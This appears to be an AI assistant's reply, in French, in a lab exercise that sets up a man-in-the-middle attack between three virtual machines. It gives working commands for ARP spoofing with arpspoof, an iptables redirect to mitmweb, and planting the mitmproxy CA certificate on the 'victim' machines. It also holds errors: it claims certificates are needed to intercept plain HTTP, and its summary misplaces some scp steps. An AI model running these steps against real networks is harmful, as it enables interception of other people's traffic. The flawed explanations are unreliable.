Oui, il est effectivement possible que les machines victimes doivent accepter les certificats générés par `mitmproxy` pour que les requêtes HTTP soient correctement interceptées et affichées sans erreurs.

Voici les étapes pour installer les certificats `mitmproxy` sur les machines victimes :

### Étape 1 : Générer et Exporter le Certificat `mitmproxy`

1. **Sur la machine attaquante (`Attacker`)**, exécutez `mitmproxy` pour générer le certificat :
   ```sh
   sudo mitmweb -p 8080
   ```

2. **Téléchargez le certificat** :
   - Ouvrez un navigateur sur la machine attaquante et allez à `http://mitm.it`.
   - Téléchargez le certificat pour le système d'exploitation correspondant (par exemple, `mitmproxy-ca-cert.pem`).

### Étape 2 : Installer le Certificat sur les Machines Victimes

#### Pour les Machines Linux (Victim1 et Victim2)

1. **Copiez le certificat** sur les machines victimes. Vous pouvez utiliser `scp` pour copier le fichier :
   - Depuis la machine attaquante (`Attacker`), exécutez :
     ```sh
     scp /path/to/mitmproxy-ca-cert.pem victim1:/tmp/
     scp /path/to/mitmproxy-ca-cert.pem victim2:/tmp/
     ```

2. **Installer le certificat sur les machines victimes** :

   - **Victim1** :
     ```sh
     sudo cp /tmp/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
     sudo update-ca-certificates
     ```

   - **Victim2** :
     ```sh
     sudo cp /tmp/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
     sudo update-ca-certificates
     ```

3. **Redémarrez les navigateurs** sur les machines victimes pour que les nouveaux certificats soient pris en compte.

### Étape 3 : Vérification de la Configuration et du Trafic Intercepté

1. **Depuis les machines victimes (`Victim1` et `Victim2`)**, accédez à un site web en HTTP, par exemple `http://example.com` :
   - Ouvrez un navigateur et allez à `http://example.com`.

2. **Vérifier le trafic intercepté** :
   - Ouvrez l'interface web de `mitmweb` sur la machine attaquante à l'adresse `http://127.0.0.1:8081`.

### Exemple Complet de Commandes

```sh
# Machine Attaquant (Attacker)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo mitmweb -p 8080

# Machine Victime 1 (Victim1)
sudo nano /etc/netplan/00-installer-config.yaml
# Configurez les adresses IP et routes comme indiqué ci-dessus
sudo netplan apply
scp /path/to/mitmproxy-ca-cert.pem victim1:/tmp/
sudo cp /tmp/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
sudo update-ca-certificates

# Machine Victime 2 (Victim2)
sudo nano /etc/netplan/00-installer-config.yaml
# Configurez les adresses IP et routes comme indiqué ci-dessus
sudo netplan apply
scp /path/to/mitmproxy-ca-cert.pem victim2:/tmp/
sudo cp /tmp/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
sudo update-ca-certificates
```

En suivant ces étapes, vous devriez être en mesure de configurer correctement les certificats `mitmproxy` sur les machines victimes, ce qui permettra à `mitmproxy` d'intercepter correctement le trafic HTTP et d'afficher les requêtes sans erreurs de certificat.
